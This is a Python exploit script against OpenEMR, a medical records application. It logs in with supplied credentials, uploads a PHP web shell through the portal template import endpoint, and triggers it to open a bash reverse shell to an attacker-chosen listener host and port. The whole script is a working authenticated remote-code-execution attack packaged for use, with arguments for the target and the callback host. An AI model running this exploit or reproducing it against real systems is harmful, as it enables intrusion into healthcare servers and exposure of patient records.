import requests
import sys
import argparse
from log_colors import *

class OpenEMRAuthShell:

    def __init__(self, url, user, pswd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        #self.payload = open(shell_file, "r")
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        print (LogColors.YELLOW + self.user + ":" + self.pswd + "..." + LogColors.ENDC)
        data = {
            'new_login_session_management' : '1',
            'authProvider' : 'Default',
            'authUser' : self.user,
            'clearPass' : self.pswd, 
            'languageChoice' : '1',
        }
        r = self.session.post(
            self.url + "/interface/main/main_screen.php?auth=login&site=default",
            data = data
        )
        if r.ok:
            print (LogColors.GREEN + "login successful :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "login failed :(" + LogColors.ENDC)
            sys.exit()

    def exploit(self):
        self.login()
        shell_php = '<?php '
        shell_php += 'exec("/bin/bash -c \'bash -i >& /dev/tcp/' + self.lhost
        shell_php += '/' + self.lport + ' 0>&1\'"); ?>'
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        print (LogColors.YELLOW + "shell: " + shell_php + LogColors.ENDC)
        pay = {
            "site" : "default",
            "mode" : "save",
            "docid" : "hacked.php",
            "content" : shell_php,
        }
        r = self.session.post(
            self.url + "/portal/import_template.php?site=default",
            data = pay
        )
        print (LogColors.YELLOW + "send payload " + pay['docid'] + "..." + LogColors.ENDC)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
            shell_url = self.url + "/portal/hacked.php"
            print (LogColors.YELLOW + shell_url + "..." + LogColors.ENDC)
            r = self.session.get(shell_url)
        else:
            print (LogColors.RED + "sending payload failed :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-user','--username', required = True, help = "auth username")
    parser.add_argument('-pswd','--password', required = True, help = "auth password")
    #parser.add_argument('-f','--file', required = True, help = "reverse shell file: (hack.php)")
    parser.add_argument('-lh','--lhost', required = True, help = "reverse shell listener host")
    parser.add_argument('-lp','--lport', required = True, help = "reverse shell listener port")
    args = vars(parser.parse_args())
    url = args["url"]
    #shell_file = args['file']
    lhost, lport = args['lhost'], args['lport']
    user, pswd = args["username"], args["password"]
    cve = OpenEMRAuthShell(url, user, pswd, lhost, lport)
    cve.exploit()

